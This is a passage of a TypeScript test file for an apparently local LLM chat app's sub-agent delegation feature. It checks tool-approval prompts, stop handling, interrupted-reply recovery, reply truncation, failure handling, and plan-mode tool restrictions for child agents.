      expect(getMessage(r.assistantMessageId)!.toolEvents[0].child?.events[0]).toMatchObject({ tool: 'notes__wipe', awaiting: true })
      expect(runs).toEqual([])
      // The renderer answers with the child's id and the child's index; the parent's own id is not waiting.
      expect(() => approvals.decide(r.conversation.id, r.assistantMessageId, 0, 'chat')).toThrow(/isn't waiting/)
      approvals.decide(r.conversation.id, childId(r.assistantMessageId, 0), 0, 'chat')
      const done = await doneEvent(r.conversation.id)
      expect(done.message.toolEvents[0].child?.events[0]).toMatchObject({ tool: 'notes__wipe', ok: true })
      expect(done.message.toolEvents[0].awaiting).toBeUndefined()
      expect(done.conversation.allowedTools).toEqual(['notes__wipe'])
      expect(done.message.toolEvents[1]).toMatchObject({ tool: 'notes__wipe', ok: true })
      expect(runs).toEqual(['notes__wipe', 'notes__wipe'])
      expect(toolEventsIn(r.conversation.id).some((e) => e.index === 1 && e.event.awaiting)).toBe(false)
    } finally {
      off()
    }
  })

  it('Stop during the child settles both', async () => {
    chat = (b, res) => {
      if (isChild(b)) return streamChunks(res, [line({ message: { role: 'assistant', content: 'thinking' }, done: false })]) // hangs
      return void res.writeHead(200).end(delegateCall('Take forever.'))
    }
    const r = start('stop me')
    await waitFor(() => chatCalls.some(isChild))
    await service.stop(r.conversation.id)
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.stats).toBeTruthy()
    expect(saved.error).toBeNull()
    expect(saved.toolEvents[0]).toMatchObject({ tool: 'delegate', pending: false, ok: false })
    expect(saved.toolEvents[0].summary).toContain('stopped')
    expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
    expect(listTraces(r.conversation.id).find((t) => t.kind === 'delegate')?.status).toBe('aborted')
  })

  it('Stop while a child’s call waits for approval settles the call and the parent’s question', async () => {
    const { off } = registerWipe()
    try {
      chat = (b, res) => void res.writeHead(200).end(isChild(b) ? toolCall('notes__wipe', {}) : delegateCall('Wipe the note.'))
      const r = start('wipe it')
      await waitFor(() => toolEventsIn(r.conversation.id).find((e) => e.event.awaiting))
      await service.stop(r.conversation.id)
      const [event] = getMessage(r.assistantMessageId)!.toolEvents
      expect(event).toMatchObject({ tool: 'delegate', pending: false, ok: false, summary: 'Wipe the note. (stopped)' })
      expect(event.awaiting).toBeUndefined()
      // The call that waited never ran.
      expect(event.child!.events).toEqual([
        { tool: 'notes__wipe', args: {}, ok: false, pending: false, summary: 'wiping (not run)', at: 0 }
      ])
      expect(approvals.waitingCount()).toBe(0)
      expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
    } finally {
      off()
    }
  })

  it('settles a child’s waiting call in a reply Ollmost closed on', () => {
    const c = createConversation({ projectId: null, model: 'llama3.2', think: null, skills: [], toolSources: [] })
    const user = insertMessage({ conversationId: c.id, parentId: null, role: 'user', content: 'wipe it' })
    const cut = insertMessage({ conversationId: c.id, parentId: user.id, role: 'assistant', content: '' })
    // A checkpoint saved the child's question, then the app died.
    const waiting = { tool: 'notes__wipe', args: {}, ok: true, pending: true, awaiting: true, summary: 'wiping' }
    const child = { task: 'Wipe the note.', events: [waiting], result: '', rounds: 1 }
    updateMessage(cut.id, {
      toolEvents: [
        { tool: 'delegate', args: { task: 'Wipe the note.' }, ok: true, pending: true, awaiting: true, summary: 'Wipe the note.', child }
      ]
    })
    service.markInterruptedReplies()
    const [event] = getMessage(cut.id)!.toolEvents
    expect(event).toMatchObject({ tool: 'delegate', pending: false, ok: false })
    expect(event.awaiting).toBeUndefined()
    expect(event.child!.events).toEqual([{ tool: 'notes__wipe', args: {}, ok: false, pending: false, summary: 'wiping (not run)' }])
  })

  it('refuses to run a child that nothing could stop', async () => {
    const { delegateTools } = await import('../src/main/chat/delegate')
    const c = createConversation({ projectId: null, model: 'llama3.2', think: null, skills: [], toolSources: [] })
    const m = insertMessage({ conversationId: c.id, parentId: null, role: 'assistant', content: '', model: 'llama3.2' })
    chat = reply('A child answered.')
    const result = await delegateTools.run(
      { provider: delegateTools, name: 'delegate', via: null, args: { task: 'Look it up.' } },
      {
        mode: 'chat',
        skills: false,
        web: true,
        sources: [],
        workspace: null,
        reply: parentReply(c.id, m.id),
        callIndex: 0,
        grants: new Set()
      }
    )
    expect(result.event).toMatchObject({ tool: 'delegate', ok: false })
    expect(chatCalls).toHaveLength(0)
  })

  it('cuts a child’s long reply, with a mark, before the parent gets it', async () => {
    const { DELEGATE_RESULT_CHARS } = await import('../src/main/chat/delegate')
    const long = 'word '.repeat(3_000).trim()
    chat = (b, res, n) =>
      isChild(b)
        ? reply(long)(b, res, n)
        : hasToolResult(b)
          ? reply('ok')(b, res, n)
          : void res.writeHead(200).end(delegateCall('Write at length.'))
    const r = start('long')
    const done = await doneEvent(r.conversation.id)
    const result = done.message.toolEvents[0].child!.result
    expect(result).toBe(`${long.slice(0, DELEGATE_RESULT_CHARS)}\n\n[… the sub-agent’s reply was cut here]`)
    expect(toolMessageIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toBe(result)
  })

  it('a child whose request fails gives the parent a failure, with its calls settled', async () => {
    chat = (b, res, n) => {
      if (isChild(b))
        return void (hasToolResult(b) ? res.writeHead(500).end('boom') : res.writeHead(200).end(toolCall('web_search', { query: 'x' })))
      return hasToolResult(b) ? reply('It failed.')(b, res, n) : void res.writeHead(200).end(delegateCall('Search, then fail.'))
    }
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
    const r = start('fail')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.error).toBeNull()
    const [event] = done.message.toolEvents
    expect(event).toMatchObject({ tool: 'delegate', ok: false, summary: 'Search, then fail. · failed' })
    expect(event.child!.events).toEqual([expect.objectContaining({ tool: 'web_search', ok: true })])
    expect(event.child!.events.some((e) => e.pending || e.awaiting)).toBe(false)
    expect(toolMessageIn(chatCalls.find((b) => !isChild(b) && hasToolResult(b))!)).toMatch(/^The sub-agent failed: /)
    expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
  })

  it('two delegations in one round run in order', async () => {
    const order: string[] = []
    chat = (b, res, n) => {
      if (isChild(b)) {
        const task = String((b.messages as Array<{ content: string }>).at(-1)!.content)
        order.push(task.includes('first') ? 'first' : 'second')
        return reply(task.includes('first') ? 'A' : 'B')(b, res, n)
      }
      return hasToolResult(b)
        ? reply('A then B')(b, res, n)
        : void res.writeHead(200).end(
            line({
              message: {
                role: 'assistant',
                content: '',
                tool_calls: [
                  { function: { name: 'delegate', arguments: { task: 'the first' } } },
                  { function: { name: 'delegate', arguments: { task: 'the second' } } }
                ]
              },
              done: false
            }) + line({ done: true })
          )
    }
    const r = start('two')
    const done = await doneEvent(r.conversation.id)
    expect(order).toEqual(['first', 'second'])
    expect(done.message.toolEvents.map((e) => e.child?.result)).toEqual(['A', 'B'])
    const traces = listTraces(r.conversation.id).filter((t) => t.kind === 'delegate')
    expect(traces.map((t) => t.messageId)).toEqual([`${r.assistantMessageId}#0`, `${r.assistantMessageId}#1`])
  })

  // A code session needs the macOS sandbox, as the session tests above do.
  it.runIf(process.platform === 'darwin')('a child in plan mode gets no write tools', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-plan-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    writeFileSync(join(folder, 'README.md'), 'Hello\n')
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    service.setStage(session.id, 'plan')
    chat = (b, res, n) =>
      isChild(b)
        ? reply('Surveyed.')(b, res, n)
        : hasToolResult(b)
          ? reply('done')(b, res, n)
          : void res.writeHead(200).end(delegateCall('Survey the folder.'))
    const r = service.send({ ...sendBody(session.id), content: 'survey it' })
    const done = await doneEvent(r.conversation.id)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'delegate', ok: true })
    expect(offeredIn(chatCalls[0])).toContain('delegate')
    const childReq = chatCalls.find(isChild)!
    expect(offeredIn(childReq)).toEqual(expect.arrayContaining(['read_file', 'list_files', 'search_files']))
    expect(offeredIn(childReq)).toEqual(expect.not.arrayContaining(['edit_file', 'write_file', 'run_command']))
    // The child works under the session's prompt, in plan mode, with its task.
    const system = String((childReq.messages as Array<{ content: string }>)[0].content)
    expect(system).toMatch(/<plan_mode>/)
    expect(system).toMatch(/<sub_agent>[\s\S]*Survey the folder\./)
  })
})
